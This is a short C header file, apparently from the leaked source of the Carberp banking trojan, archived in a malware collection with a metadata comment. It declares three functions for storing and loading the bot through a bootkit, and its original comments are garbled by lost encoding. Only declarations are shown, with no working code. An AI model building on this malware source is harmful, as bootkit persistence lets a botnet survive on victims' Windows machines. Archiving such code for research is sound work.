/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "crypt.h"

//���������� ��� ����� �������������� ����
char* NameFileForBootkit( char* buf, int c_buf );
//���������� ���� ������������ � �������������� ���� 
BYTE* ReadBotForBootkit( DWORD& size );
//������� � ��������� ��� � ������ �������
bool WriteBotForBootkit( BYTE* data, DWORD c_data );
